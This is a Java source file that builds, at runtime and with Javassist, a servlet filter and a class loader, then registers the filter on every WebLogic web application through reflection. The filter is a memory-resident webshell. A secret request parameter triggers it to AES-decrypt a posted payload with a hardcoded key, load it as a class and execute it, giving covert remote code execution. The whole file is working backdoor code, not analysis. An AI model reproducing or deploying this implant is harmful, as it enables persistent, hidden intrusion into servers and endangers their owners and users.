package org.unicodesec;

import javassist.*;
import weblogic.management.DeploymentException;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.t3.srvr.ServerRuntime;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.List;

/**
 * Hello world!
 */
public class App {
    public static void main(String[] args) throws NotFoundException, CannotCompileException, ClassNotFoundException, NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, DeploymentException {
        String clazzName = "filterUnicodesec";
        ClassPool pool = ClassPool.getDefault();
        pool.importPackage("java.lang.reflect");
        pool.importPackage("java.util");
        CtClass ctClass = pool.makeClass(clazzName);
        CtClass innerClass = pool.makeClass("unicodeSecLoader");
        innerClass.setSuperclass(pool.get("java.lang.ClassLoader"));

        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{pool.get("java.lang.ClassLoader")}, innerClass);
        ctConstructor.setBody("{" +
                "super($1);}");
        innerClass.addConstructor(ctConstructor);

        CtMethod defineClassM = new CtMethod(pool.get("java.lang.Class"), "defineClass", new CtClass[]{pool.get("byte[]")}, innerClass);
        defineClassM.setBody("{return super.defineClass($1, 0, $1.length);}");
        innerClass.addMethod(defineClassM);

        ctClass.addInterface(pool.get("javax.servlet.Filter"));

        //public void init(FilterConfig config)
        CtMethod initM = new CtMethod(CtClass.voidType, "init", new CtClass[]{pool.makeInterface("javax.servlet.FilterConfig")}, ctClass);
        initM.setModifiers(Modifier.PUBLIC);
        initM.setBody("{}");
        ctClass.addMethod(initM);

        //public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
        CtMethod doFilterM = new CtMethod(CtClass.voidType, "doFilter", new CtClass[]{pool.get("javax.servlet.ServletRequest"), pool.get("javax.servlet.ServletResponse"), pool.get("javax.servlet.FilterChain")}, ctClass);
        doFilterM.setModifiers(Modifier.PUBLIC);
        pool.importPackage("javax.servlet");
        pool.importPackage("javax.servlet.http");
        pool.importPackage("java.io");
        pool.importPackage("javax.crypto");
        pool.importPackage("javax.crypto.spec");
        pool.importPackage("java.lang.reflect");
        doFilterM.setBody("{" +
                "        if (\"unicodesec\".equals($1.getParameter(\"Bigdick\"))) {\n" +
                "            ServletInputStream sis = $1.getInputStream();\n" +
                "            byte[] b = new byte[1024];\n" +
                "            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n" +
                "            while (sis.readLine(b, 0, b.length) != -1) {\n" +
                "                byteArrayOutputStream.write(b);\n" +
                "            }\n" +
                "            String payload;\n" +
                "            DataInputStream din = new DataInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));\n" +
                "\n" +
                "\n" +
                "            try {\n" +
                "                while (true) {\n" +
                "                    short s = din.readShort();\n" +
                "                    if (s == (short) 0x504e) {\n" +
                "                        payload = din.readUTF();\n" +
                "                        break;\n" +
                "                    }\n" +
                "\n" +
                "                }\n" +
                "                String k = \"7f55a0ed8b021080\";\n" +
                "                ((HttpServletRequest) $1).getSession().putValue(\"u\", k);\n" +
                "\n" +
                "                Cipher c = Cipher.getInstance(\"AES\");\n" +
                "                c.init(2, new SecretKeySpec(k.getBytes(), \"AES\"));\n" +
                "                Class shell = new unicodeSecLoader(Thread.currentThread().getClass().getClassLoader()).defineClass(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload)));\n" +
                "                Object a = shell.newInstance();\n" +
                "                Method m = shell.getDeclaredMethod(\"fuck\", new Class[]{ServletRequest.class, ServletResponse.class});\n" +
                "                m.invoke(a, new Object[]{$1, $2});\n" +
                "            } catch (Exception e) {\n" +
                "                e.printStackTrace();\n" +
                "            }\n" +
                "        } else {\n" +
                "            $3.doFilter($1, $2);\n" +
                "        }" +
                "}");
        ctClass.addMethod(doFilterM);

        // public void destroy()
        CtMethod destroyM = new CtMethod(CtClass.voidType, "destroy", new CtClass[]{}, ctClass);
        destroyM.setModifiers(Modifier.PUBLIC);
        destroyM.setBody("{}");
        ctClass.addMethod(destroyM);
        innerClass.toClass();
        ctClass.toClass();


        List<WebAppServletContext> contexts = findAllContext();
        for (WebAppServletContext context : contexts) {
            context.registerFilter("test", clazzName, new String[]{"/*"}, null, null, null);
        }

    }

    public static List<WebAppServletContext> findAllContext() throws ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException {
        java.lang.reflect.Method m = Class.forName("weblogic.t3.srvr.ServerRuntime").getDeclaredMethod("theOne");
        m.setAccessible(true);
        ServerRuntime serverRuntime = (ServerRuntime) m.invoke(null);
        List<WebAppServletContext> list = new java.util.ArrayList();
        for (weblogic.management.runtime.ApplicationRuntimeMBean applicationRuntime : serverRuntime.getApplicationRuntimes()) {
            java.lang.reflect.Field childrenF = applicationRuntime.getClass().getSuperclass().getDeclaredField("children");
            childrenF.setAccessible(true);
            java.util.HashSet set = (java.util.HashSet) childrenF.get(applicationRuntime);
            for (Object key : set) {
                if (key.getClass().getName().equals("weblogic.servlet.internal.WebAppRuntimeMBeanImpl")) {

                    Field contextF = key.getClass().getDeclaredField("context");
                    contextF.setAccessible(true);
                    WebAppServletContext context = (WebAppServletContext) contextF.get(key);
                    list.add(context);
                }
            }
        }
        return list;
    }
}
